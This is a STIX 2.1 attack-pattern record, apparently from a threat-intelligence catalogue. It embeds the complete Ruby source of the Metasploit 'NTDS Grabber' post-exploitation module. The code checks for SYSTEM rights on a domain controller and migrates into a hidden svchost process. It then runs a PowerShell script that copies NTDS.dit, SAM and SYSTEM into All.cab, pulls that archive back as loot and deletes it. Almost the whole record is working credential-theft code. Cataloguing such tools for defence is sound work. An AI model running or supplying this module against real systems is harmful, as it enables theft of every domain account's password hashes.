{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--57757b7d-2700-421c-ab99-c22b9c91d3bf",
    "created": "2024-08-14T16:33:05.048792Z",
    "modified": "2024-08-14T16:33:05.048796Z",
    "name": "NTDS Grabber",
    "description": " This module uses a powershell script to obtain a copy of the ntds,dit SAM and SYSTEM files on a domain controller. It compresses all these files in a cabinet file called All.cab.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/ntds_grabber.rb",
            "external_id": "ntds_grabber.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Accounts\n  include Msf::Post::Windows::Powershell\n  include Msf::Post::Windows::Priv\n  include Msf::Post::File\n  include Msf::Post::Common\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'NTDS Grabber',\n        'Description' => %q{\n          This module uses a powershell script to obtain a copy of the ntds,dit SAM and SYSTEM files on a domain controller.\n          It compresses all these files in a cabinet file called All.cab.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => ['Koen Riepe (koen.riepe@fox-it.com)'],\n        'References' => [''],\n        'Platform' => [ 'win' ],\n        'Arch' => [ 'x86', 'x64' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_migrate\n              stdapi_railgun_api\n              stdapi_sys_process_execute\n              stdapi_sys_process_getpid\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptBool.new('DOWNLOAD', [ true, 'Immediately download the All.cab file', true ]),\n        OptBool.new('CLEANUP', [ true, 'Remove the All.cab file at the end of module execution', true ])\n      ],\n      self.class\n    )\n  end\n\n  def task_running(task)\n    session.shell_write(\"tasklist \\n\")\n    tasklist = session.shell_read(-1, 10).split(\"\\n\")\n    tasklist.each do |prog|\n      if prog.include? task\n        session.shell_close\n        return true\n      end\n    end\n    return false\n  end\n\n  def check_32_on_64\n    apicall = session.railgun.kernel32.IsWow64Process(-1, 4)['Wow64Process']\n    # railgun returns '\\x00\\x00\\x00\\x00' if the meterpreter process is 64bits.\n    if apicall == \"\\x00\\x00\\x00\\x00\"\n      migrate = false\n    else\n      migrate = true\n    end\n    return migrate\n  end\n\n  def get_windows_loc\n    apicall = session.railgun.kernel32.GetEnvironmentVariableA('Windir', 255, 255)['lpBuffer']\n    windir = apicall.split(':')[0]\n    return windir\n  end\n\n  def run\n    downloadflag = datastore['DOWNLOAD']\n    cleanupflag = datastore['CLEANUP']\n\n    if is_system?\n      print_good('Running as SYSTEM')\n    else\n      print_error('Not running as SYSTEM, you need to be system to run this module! STOPPING')\n      return\n    end\n\n    unless domain_controller?\n      print_error('Host is not a domain controller. This module must be on a domain controller! STOPPING')\n      return\n    end\n\n    print_good('Running on a domain controller')\n\n    if have_powershell?\n      print_good('PowerShell is installed.')\n    else\n      print_error('PowerShell is not installed! STOPPING')\n      return\n    end\n\n    if check_32_on_64\n      print_error('The meterpreter is not the same architecture as the OS! Migrating to process matching architecture!')\n      windir = get_windows_loc\n      newproc = \"#{windir}:\\\\windows\\\\sysnative\\\\svchost.exe\"\n      if exist?(newproc)\n        print_status(\"Starting new x64 process #{newproc}\")\n        pid = session.sys.process.execute(newproc, nil, { 'Hidden' => true, 'Suspended' => true }).pid\n        print_good(\"Got pid #{pid}\")\n        print_status('Migrating..')\n        session.core.migrate(pid)\n        if pid == session.sys.process.getpid\n          print_good('Success!')\n        else\n          print_error('Migration failed!')\n        end\n      end\n    else\n      print_good('The meterpreter is the same architecture as the OS!')\n    end\n\n    base_script = File.read(File.join(Msf::Config.data_directory, 'post', 'powershell', 'NTDSgrab.ps1'))\n    execute_script(base_script)\n    print_status('Powershell Script executed')\n    cabcount = 0\n\n    while cabcount < 2\n      if task_running('makecab.exe')\n        cabcount += 1\n        while cabcount < 2\n          print_status('Creating All.cab')\n          if !task_running('makecab.exe')\n            cabcount += 1\n            until file_exist?('All.cab')\n              sleep(1)\n              print_status('Waiting for All.cab')\n            end\n            print_good('All.cab should be created in the current working directory')\n          end\n          sleep(1)\n        end\n      end\n      sleep(1)\n    end\n\n    if downloadflag\n      print_status('Downloading All.cab')\n      p1 = store_loot('Cabinet File', 'application/cab', session, read_file('All.cab'), 'All.cab', 'Cabinet file containing SAM, SYSTEM and NTDS.dit')\n      print_good(\"All.cab saved in: #{p1}\")\n    end\n\n    if cleanupflag\n      print_status('Removing All.cab')\n      begin\n        file_rm('All.cab')\n      rescue StandardError\n        print_error('Problem with removing All.cab. Manually check if it\\'s still there.')\n      end\n      if !file_exist?('All.cab')\n        print_good('All.cab Removed')\n      else\n        print_error('All.cab was not removed')\n      end\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}